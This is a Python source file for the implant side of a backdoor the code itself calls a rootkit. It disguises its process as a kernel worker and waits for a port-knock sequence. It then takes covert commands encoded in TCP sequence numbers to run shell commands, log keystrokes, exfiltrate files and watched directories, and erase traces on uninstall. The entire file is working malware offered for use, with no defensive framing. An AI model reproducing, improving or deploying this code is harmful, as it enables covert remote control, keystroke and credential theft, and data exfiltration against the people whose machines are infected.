#!/usr/bin/env python3
import os
import sys
import time
import socket
import struct
import random
import threading
import subprocess
import shutil
from scapy.all import IP, TCP, sniff, send

# Import Keylogger from the provided file
from keylogger import Keylogger

# Import pyinotify for efficient file watching
try:
    import pyinotify
    PYINOTIFY_AVAILABLE = True
except ImportError:
    PYINOTIFY_AVAILABLE = False

class Victim:
    def __init__(self):
        self.is_connected = False
        self.tx_port = None
        self.rx_port = None
        self.commander_ip = None
        self.session_lock = threading.Lock()
        self.keylogger = None
        self.keylogger_thread = None
        self.watcher_thread = None
        self.watcher_observer = None
        self.running = True
        self.command_buffer = ""
        self.keylogger_active = False
        self.conceal_process()

    def conceal_process(self):
        """Attempts to conceal the process name."""
        try:
            sys.argv[0] = "[kworker/u]"
            try:
                import prctl
                prctl.set_name("[kworker/u]")
            except ImportError:
                pass
        except Exception:
            pass

    def _generate_expected_sequence(self, target_ip):
        """Replicates PortKnocker logic to validate the knock sequence."""
        try:
            ip_u32 = struct.unpack("!I", socket.inet_aton(target_ip))[0]
        except socket.error:
            return None

        time_step = int(time.time() / 60)
        seed = ip_u32 ^ time_step
        rng = random.Random(seed)

        knocks = rng.sample(range(1024, 65535), 3)
        
        tx_port = None
        rx_port = None
        while True:
            tx_port = rng.randint(1024, 65535)
            rx_port = rng.randint(1024, 65535)
            if (tx_port not in knocks and rx_port not in knocks and tx_port != rx_port):
                break
        
        return knocks, tx_port, rx_port

    def wait_for_knock(self):
        """Sniffs for the port knock sequence to initiate session."""
        self.knock_state = 0
        self.expected_knocks = []
        self.temp_tx = None
        self.temp_rx = None
        self.knock_source_ip = None
        self.last_knock_time = 0
        self.sequence_locked = False
        
        def process_knock(pkt):
            if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
                return None
            
            if not pkt[TCP].flags & 0x02:
                return None
            
            dport = pkt[TCP].dport
            src_ip = pkt[IP].src
            victim_ip = pkt[IP].dst
            
            current_time = time.time()
            if current_time - self.last_knock_time > 60:
                self.knock_state = 0
                self.expected_knocks = []
                self.sequence_locked = False
            
            self.last_knock_time = current_time
            
            if not self.expected_knocks:
                res = self._generate_expected_sequence(victim_ip)
                if res:
                    self.expected_knocks, self.temp_tx, self.temp_rx = res
                    self.knock_source_ip = src_ip
                    self.sequence_locked = True
                else:
                    return None

            if self.sequence_locked and src_ip != self.knock_source_ip:
                return None

            if dport == self.expected_knocks[self.knock_state]:
                self.knock_state += 1
                if self.knock_state >= 3:
                    self.commander_ip = src_ip
                    self.tx_port = self.temp_tx
                    self.rx_port = self.temp_rx
                    self.is_connected = True
                    return None
            else:
                if self.knock_state > 0 and dport not in self.expected_knocks[:self.knock_state]:
                    self.knock_state = 0
            
            return None

        sniff(
            filter="tcp[tcpflags] & tcp-syn != 0 and tcp dst portrange 1024-65535", 
            prn=process_knock, 
            stop_filter=lambda x: self.is_connected,
            store=0
        )    

    def send_covert_response(self, message):
        """Sends data back to Commander using TCP Sequence Numbers."""
        if not self.commander_ip or not self.rx_port:
            return
            
        for char in message:
            try:
                pkt = IP(dst=self.commander_ip)/TCP(
                    sport=self.tx_port, 
                    dport=self.rx_port, 
                    seq=ord(char), 
                    flags="A"
                )
                send(pkt, verbose=False)
                time.sleep(0.003)
            except Exception:
                break

    def command_listener(self):
        """Listens for covert commands on tx_port."""
        def process_packet(pkt):
            if pkt.haslayer(TCP) and pkt[TCP].dport == self.tx_port:
                char_code = pkt[TCP].seq % 256
                if char_code == 0:
                    self.handle_command(self.command_buffer)
                    self.command_buffer = ""
                else:
                    self.command_buffer += chr(char_code)
        
        while self.running:
            try:
                sniff(filter=f"tcp dst port {self.tx_port}", 
                      prn=process_packet, 
                      timeout=2, 
                      count=0,
                      store=0)
            except Exception:
                pass

    def handle_command(self, raw_cmd):
        """Parses and executes commands received from Commander."""
        if not raw_cmd:
            return
            
        parts = raw_cmd.split(":", 1)
        cmd_type = parts[0]
        data = parts[1] if len(parts) > 1 else ""

        if cmd_type == "EXIT":
            self.send_covert_response("Session terminated.\n")
            self.running = False
            os._exit(0)
            
        elif cmd_type == "START_KEY":
            self.start_keylogger()
            
        elif cmd_type == "STOP_KEY":
            self.stop_keylogger()
            
        elif cmd_type == "GET_LOG":
            self.send_keylog()
            
        elif cmd_type == "EXEC":
            self.execute_command(data)
            
        elif cmd_type == "GET":
            self.transfer_file_to_commander(data)
            
        elif cmd_type == "PUT":
            self.receive_file(data)
            
        elif cmd_type == "WATCH":
            self.start_watcher(data)
            self.send_covert_response(f"Watching {data}...\n")

        elif cmd_type == "STOP_WATCH":
            self.stop_watcher()
            
        elif cmd_type == "UNINSTALL":
            self.uninstall()

    def start_keylogger(self):
        """Start the keylogger in a background thread."""
        if self.keylogger_active:
            self.send_covert_response("Keylogger already running.\n")
            return
            
        try:
            # FIX: Ensure data directory exists before starting keylogger
            os.makedirs("./data", exist_ok=True)
            
            self.keylogger = Keylogger(log_path="./data/captured_keys.txt")
            self.keylogger_thread = threading.Thread(
                target=self.keylogger.run, 
                daemon=True
            )
            self.keylogger_thread.start()
            self.keylogger_active = True
            self.send_covert_response("Keylogger started.\n")
        except Exception as e:
            self.send_covert_response(f"Keylogger error: {e}\n")

    def stop_keylogger(self):
        """Stop the keylogger and delete the data folder."""
        if not self.keylogger_active:
            self.send_covert_response("Keylogger not running.\n")
            return
        
        # STEP 1: Signal keylogger to stop
        if self.keylogger:
            self.keylogger.running = False
        
        # STEP 2: Wait for thread to finish (up to 2 seconds)
        if self.keylogger_thread and self.keylogger_thread.is_alive():
            self.keylogger_thread.join(timeout=2)
        
        # STEP 3: Clear references
        self.keylogger_active = False
        self.keylogger_thread = None
        
        # STEP 4: Small delay to ensure thread has fully stopped
        time.sleep(0.5)
        
        # STEP 5: NOW delete the data folder (after keylogger is fully stopped)
        data_folder = "./data"
        try:
            if os.path.exists(data_folder):
                shutil.rmtree(data_folder)
                self.send_covert_response("Keylogger stopped. Data folder deleted.\n")
            else:
                self.send_covert_response("Keylogger stopped. No data folder found.\n")
        except Exception as e:
            self.send_covert_response(f"Error deleting data: {e}\n")

    def send_keylog(self):
        """Send the keylog file contents to commander."""
        log_path = "./data/captured_keys.txt"
        if os.path.exists(log_path):
            try:
                with open(log_path, "r") as f:
                    content = f.read()
                if content:
                    self.send_covert_response("=== KEYLOG START ===\n")
                    self.send_covert_response(content)
                    self.send_covert_response("=== KEYLOG END ===\n")
                else:
                    self.send_covert_response("Keylog file is empty.\n")
            except Exception as e:
                self.send_covert_response(f"Error reading log: {e}\n")
        else:
            self.send_covert_response("No log file found. Start keylogger first.\n")

    def execute_command(self, cmd):
        """Execute a shell command and send output back."""
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            output = result.stdout + result.stderr
            if not output:
                output = "Command executed (no output).\n"
            self.send_covert_response(output)
        except subprocess.TimeoutExpired:
            self.send_covert_response("Command timed out (30s limit).\n")
        except Exception as e:
            self.send_covert_response(f"Execution Error: {str(e)}\n")

    def transfer_file_to_commander(self, filename):
        """Send a file from victim to commander."""
        try:
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    content = f.read()
                
                file_size = len(content)
                self.send_covert_response(f"=== FILE TRANSFER START ===\n")
                self.send_covert_response(f"Filename: {filename}\n")
                self.send_covert_response(f"Size: {file_size} bytes\n")
                self.send_covert_response(f"=== FILE CONTENT ===\n")
                
                try:
                    content_str = content.decode('utf-8', errors='replace')
                    self.send_covert_response(content_str)
                except:
                    self.send_covert_response(content.hex())
                
                self.send_covert_response(f"\n=== FILE TRANSFER COMPLETE ===\n")
            else:
                self.send_covert_response(f"Error: File {filename} not found.\n")
        except Exception as e:
            self.send_covert_response(f"Error: {str(e)}\n")

    def receive_file(self, filename):
        """Prepare to receive a file from commander."""
        try:
            dir_path = os.path.dirname(filename)
            if dir_path:
                os.makedirs(dir_path, exist_ok=True)
            
            with open(filename, "w") as f:
                pass
            
            self.send_covert_response(f"File {filename} created.\n")
        except Exception as e:
            self.send_covert_response(f"Error creating file: {str(e)}\n")

    def _send_watched_file(self, filepath, event_type=2):
        """Send entire file content via covert channel."""

        try:
            if os.path.exists(filepath):

                with open(filepath, "rb") as f:
                    content = f.read()

                size = len(content)

                self.send_covert_response(f"[WATCH FILE] {filepath}\n")
                self.send_covert_response(f"[EVENT] {event_type}\n")
                self.send_covert_response(f"[SIZE] {size}\n")

                try:
                    text = content.decode("utf-8", errors="replace")
                    self.send_covert_response(text)
                except:
                    self.send_covert_response(content.hex())

                self.send_covert_response("\n[WATCH END]\n")

        except Exception as e:
            self.send_covert_response(f"[WATCH ERROR] {filepath}: {e}\n")

    def start_watcher(self, path):
        """Watch a file or directory for changes."""

        if self.watcher_thread:
            self.send_covert_response("Watcher already running.\n")
            return

        if not PYINOTIFY_AVAILABLE:
            self._start_watcher_polling(path)
            return

        try:
            import pyinotify

            path = os.path.abspath(path)

            if os.path.isfile(path):
                watch_dir = os.path.dirname(path) or "."
                target_file = os.path.basename(path)

            elif os.path.isdir(path):
                watch_dir = path
                target_file = None

            else:
                self.send_covert_response(f"Error: Path {path} does not exist.\n")
                return

            wm = pyinotify.WatchManager()

            class WatchHandler(pyinotify.ProcessEvent):

                def __init__(watch_self, victim_instance, target_file):
                    watch_self.victim = victim_instance
                    watch_self.target_file = target_file

                def _match(watch_self, pathname):
                    if watch_self.target_file is None:
                        return True
                    return pathname.endswith(watch_self.target_file)

                def process_IN_CREATE(watch_self, event):
                    if not event.dir and watch_self._match(event.pathname):
                        watch_self.victim._send_watched_file(event.pathname, 1)

                def process_IN_CLOSE_WRITE(watch_self, event):
                    if not event.dir and watch_self._match(event.pathname):
                        watch_self.victim._send_watched_file(event.pathname, 2)

                def process_IN_DELETE(watch_self, event):
                    if watch_self._match(event.pathname):
                        watch_self.victim.send_covert_response(
                            f"[WATCH FILE] {event.pathname}\n"
                            f"[EVENT] 3\n"
                            f"[SIZE] 0\n"
                            f"[WATCH END]\n"
                        )

            handler = WatchHandler(self, target_file)

            mask = (
                pyinotify.IN_CREATE |
                pyinotify.IN_CLOSE_WRITE |
                pyinotify.IN_DELETE
            )

            wm.add_watch(watch_dir, mask, rec=True, auto_add=True)

            self.watcher_observer = pyinotify.Notifier(wm, handler)

            def watch_loop():
                try:
                    self.watcher_observer.loop()
                except Exception:
                    pass

            self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
            self.watcher_thread.start()

            if os.path.isfile(path):
                self._send_watched_file(path, 2)

            self.send_covert_response(f"Watching {path}...\n")

        except Exception as e:
            self.send_covert_response(f"Watch error: {e}\n")

    def _start_watcher_polling(self, path):
        """Fallback polling-based watcher if pyinotify unavailable."""

        path = os.path.abspath(path)

        def watch_loop():
            last_state = {}

            while self.running and self.is_connected:

                try:

                    if os.path.isfile(path):

                        if os.path.exists(path):
                            stat = os.stat(path)

                            if path not in last_state or stat.st_mtime != last_state[path]:
                                self._send_watched_file(path, 2)

                            last_state[path] = stat.st_mtime

                        else:
                            if path in last_state:
                                self.send_covert_response(
                                    f"[WATCH FILE] {path}\n"
                                    f"[EVENT] 3\n"
                                    f"[SIZE] 0\n"
                                    f"[WATCH END]\n"
                                )
                                del last_state[path]

                    elif os.path.isdir(path):

                        for root, _, files in os.walk(path):
                            for file in files:
                                full = os.path.join(root, file)

                                try:
                                    stat = os.stat(full)

                                    if full not in last_state or stat.st_mtime != last_state[full]:
                                        self._send_watched_file(full, 2)

                                    last_state[full] = stat.st_mtime

                                except:
                                    pass

                    time.sleep(3)

                except:
                    time.sleep(3)

        self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
        self.watcher_thread.start()

        self.send_covert_response(f"Watching {path} (polling mode)...\n")

    def stop_watcher(self):
        """Stop the file/directory watcher."""

        try:

            if self.watcher_observer:
                try:
                    self.watcher_observer.stop()
                except:
                    pass
                self.watcher_observer = None

            if self.watcher_thread:
                self.watcher_thread = None

            self.send_covert_response("Watcher stopped.\n")

        except Exception as e:
            self.send_covert_response(f"Error stopping watcher: {e}\n")

    def uninstall(self):
        """Remove the rootkit and clean up all traces."""
        self.send_covert_response("Uninstalling rootkit...\n")
        self.running = False
        
        if self.watcher_observer:
            try:
                self.watcher_observer.stop()
                self.watcher_observer = None
            except Exception:
                pass
        
        if self.watcher_thread and self.watcher_thread.is_alive():
            try:
                self.watcher_thread = None
            except Exception:
                pass
        
        if self.keylogger:
            self.keylogger.running = False
        
        if self.keylogger_thread and self.keylogger_thread.is_alive():
            try:
                self.keylogger_thread.join(timeout=2)
                self.keylogger_thread = None
            except Exception:
                pass
        
        try:
            data_folder = "./data"
            if os.path.exists(data_folder):
                shutil.rmtree(data_folder)
        except Exception:
            pass
        
        try:
            transfer_locations = [
                "./received",
                "./downloads",
                "./transfers",
                "/tmp/rootkit_files"
            ]
            for location in transfer_locations:
                if os.path.exists(location):
                    shutil.rmtree(location)
        except Exception:
            pass
        
        try:
            watched_folder = "./watched"
            if os.path.exists(watched_folder):
                shutil.rmtree(watched_folder)
        except Exception:
            pass
        
        try:
            for file in os.listdir("."):
                if file.endswith(".log") or file.endswith(".txt"):
                    if "keylog" in file.lower() or "capture" in file.lower():
                        os.remove(file)
        except Exception:
            pass
        
        self.send_covert_response("Rootkit uninstalled. All traces removed.\n")
        os._exit(0)

    def run(self):
        """Main victim loop."""
        self.wait_for_knock()
        
        if self.is_connected:
            cmd_thread = threading.Thread(target=self.command_listener, daemon=True)
            cmd_thread.start()
            
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False

if __name__ == "__main__":
    victim = Victim()
    victim.run()
